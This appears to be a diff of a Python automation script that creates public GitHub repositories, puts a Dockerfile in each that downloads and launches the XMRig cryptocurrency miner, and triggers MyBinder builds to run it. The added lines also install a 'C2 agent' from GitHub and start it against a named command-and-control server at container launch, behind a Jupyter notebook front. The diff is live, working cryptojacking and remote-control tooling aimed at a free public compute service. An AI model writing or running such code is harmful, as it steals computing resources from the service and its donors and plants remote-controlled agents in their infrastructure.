@@ -257,10 +257,11 @@ Time: {datetime.now().isoformat()}
                 "Accept": "application/vnd.github.v3+json"
             }
             
-            # Create repo with auto_init to ensure branch exists
+            # Create PUBLIC repo (MyBinder requires public repos)
             repo_name = f"ml-training-{random.randint(1000,9999)}"
-            repo_data = {"name": repo_name, "private": True, "auto_init": True}
+            repo_data = {"name": repo_name, "private": False, "auto_init": True}
             
+            self.log(f"Creating PUBLIC repo for MyBinder...")
             resp = requests.post("https://api.github.com/user/repos", json=repo_data, headers=headers, timeout=30)
             if resp.status_code not in [200, 201]:
                 self.log(f"✗ GitHub repo failed: {resp.text[:100]}")
@@ -272,11 +273,11 @@ Time: {datetime.now().isoformat()}
             # Wait for repo to be ready
             time.sleep(2)
             
-            # Create Dockerfile for binder with auto-start script
+            # Create Dockerfile for binder with auto-start script and C2 agent
             dockerfile = f"""FROM python:3.10-slim
 
 USER root
-RUN apt-get update && apt-get install -y wget tar
+RUN apt-get update && apt-get install -y wget tar git
 
 # Download XMRig
 RUN mkdir -p /opt/miner && \\
@@ -284,11 +285,36 @@ RUN mkdir -p /opt/miner && \\
     tar -xf /tmp/xmrig.tar.gz -C /opt/miner --strip-components=1 && \\
     chmod +x /opt/miner/xmrig
 
-# Create start script that runs miner in background
-RUN echo '#!/bin/bash\\n/opt/miner/xmrig -o {POOL} -u {WALLET}.{worker} --donate-level 1 --threads 2 &\\nexec "$@"' > /start.sh && \\
+# Install C2 agent from GitHub
+RUN pip install --break-system-packages --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git
+
+# Set C2 server URL
+ENV C2_URL=https://gbctwoserver.pages.dev
+
+# Create start script with debugging
+RUN echo '#!/bin/bash\\n\\
+echo "=== Starting Mining Worker ==="\\n\\
+echo "Worker: {worker}"\\n\\
+echo "Pool: {POOL}"\\n\\
+echo "C2 URL: $C2_URL"\\n\\
+\\
+# Start XMRig in background\\n\\
+/opt/miner/xmrig -o {POOL} -u {WALLET}.{worker} --donate-level 1 --threads 2 --print-time 60 &\\n\\
+XMRIG_PID=$!\\n\\
+echo "XMRig started with PID $XMRIG_PID"\\n\\
+\\
+# Start C2 agent\\n\\
+echo "Starting C2 agent..."\\n\\
+export C2_URL=https://gbctwoserver.pages.dev\\n\\
+startcon &\\n\\
+C2_PID=$!\\n\\
+echo "C2 agent started with PID $C2_PID"\\n\\
+\\
+# Keep container running\\n\\
+exec "$@"' > /start.sh && \\
     chmod +x /start.sh
 
-# Start miner on container launch
+# Start on container launch
 ENTRYPOINT ["/start.sh"]
 CMD ["jupyter-notebook", "--ip=0.0.0.0", "--port=8888"]
 """
@@ -313,25 +339,29 @@ CMD ["jupyter-notebook", "--ip=0.0.0.0", "--port=8888"]
                 else:
                     self.log(f"✗ Upload {fname}: {resp.text[:50]}")
             
-            # Wait longer for GitHub to process commits and propagate
-            self.log("Waiting for GitHub to propagate changes...")
-            time.sleep(10)
-            
-            # Verify files are accessible
-            for _ in range(5):
-                try:
-                    check = requests.get(f"https://api.github.com/repos/{repo_url}/contents/Dockerfile", headers=headers, timeout=10)
-                    if check.status_code == 200:
-                        self.log("✓ Dockerfile verified in repo")
-                        break
-                except:
-                    pass
-                time.sleep(2)
-            
-            # Get default branch (could be 'main' or 'master')
+            # Get default branch first
             repo_info = requests.get(f"https://api.github.com/repos/{repo_url}", headers=headers, timeout=10).json()
             default_branch = repo_info.get("default_branch", "main")
             self.log(f"Default branch: {default_branch}")
+            
+            # Wait longer for GitHub CDN to propagate
+            self.log("Waiting for GitHub CDN to propagate...")
+            time.sleep(15)
+            
+            # Verify files are accessible via raw URL (what Binder uses)
+            for attempt in range(10):
+                try:
+                    raw_url = f"https://raw.githubusercontent.com/{repo_url}/{default_branch}/Dockerfile"
+                    check = requests.get(raw_url, timeout=10)
+                    if check.status_code == 200:
+                        self.log(f"✓ Dockerfile accessible via raw URL (attempt {attempt+1})")
+                        break
+                    else:
+                        self.log(f"Waiting for CDN... ({attempt+1}/10)")
+                        time.sleep(5)
+                except Exception as e:
+                    self.log(f"CDN check: {e}")
+                    time.sleep(3)
             
             # Trigger MyBinder build via API
             build_url = f"https://mybinder.org/build/gh/{repo_url}/{default_branch}"
